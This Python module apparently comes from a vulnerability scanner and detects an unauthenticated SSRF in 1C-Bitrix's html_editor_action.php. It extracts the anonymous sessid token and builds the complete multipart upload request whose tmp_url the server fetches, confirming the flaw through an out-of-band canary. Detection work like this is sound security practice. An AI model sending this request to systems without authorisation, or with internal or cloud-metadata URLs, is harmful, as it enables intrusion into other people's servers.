"""1C-Bitrix unauthenticated SSRF via ``html_editor_action.php`` — OAST-confirmed, detection only.

1C-Bitrix (dominant in RU/CIS) exposes an upload handler,
``/bitrix/tools/html_editor_action.php?action=uploadfile``, that server-side **fetches** a
caller-supplied ``bxu_files[…][files][default][tmp_url]``. On unpatched installs the CSRF
``sessid`` needed to reach it is itself readable unauthenticated from
``/bitrix/tools/composite_data.php`` — so an anonymous attacker makes the box fetch an arbitrary
URL (SSRF → cloud-metadata / internal services). This module builds the benign request whose
``tmp_url`` is an **OAST canary**; a callback from the target proves the SSRF with nothing
extracted and no file written. Weaponizing the SSRF (metadata theft, internal pivot) → Strix.

Sources: STAR Labs CVE-2023-1714/1719; github.com/k1rurk/check_bitrix; github.com/JackPot777/bitrix.
"""

from __future__ import annotations

import re

COMPOSITE_DATA_PATH = "/bitrix/tools/composite_data.php"
HTML_EDITOR_PATH = "/bitrix/tools/html_editor_action.php"

# composite_data.php echoes the anonymous session token (bitrix_sessid) into its JS body.
_SESSID_RE = re.compile(r"(?:bitrix_sessid|sessid)['\"]?\s*[:=]\s*['\"]([0-9a-fA-F]{16,64})['\"]")

_BOUNDARY = "----MoonBitrixBoundary7f3a91"


def extract_sessid(body: str) -> str | None:
    """Pull the ``bitrix_sessid`` token out of a ``composite_data.php`` response (pure)."""

    m = _SESSID_RE.search(body or "")
    return m.group(1) if m else None


def build_upload_multipart(sessid: str, tmp_url: str, *, boundary: str = _BOUNDARY,
                           field: str = "moonf") -> tuple[bytes, str]:
    """Build the ``action=uploadfile`` multipart body whose ``tmp_url`` is the SSRF/OAST target,
    returning ``(body_bytes, content_type)`` (pure)."""

    fields = [
        ("action", "uploadfile"),
        ("sessid", sessid or ""),
        ("bxu_info[CID]", "moonCID01"),
        ("bxu_info[packageIndex]", "pIndexMoon0"),
        ("bxu_info[filesCount]", "1"),
        ("bxu_info[mode]", "upload"),
        (f"bxu_files[{field}][files][default][tmp_url]", tmp_url),
        (f"bxu_files[{field}][files][default][name]", "moon.png"),
    ]
    chunks = "".join(
        f'--{boundary}\r\nContent-Disposition: form-data; name="{k}"\r\n\r\n{v}\r\n'
        for k, v in fields)
    body = (chunks + f"--{boundary}--\r\n").encode()
    return body, f"multipart/form-data; boundary={boundary}"
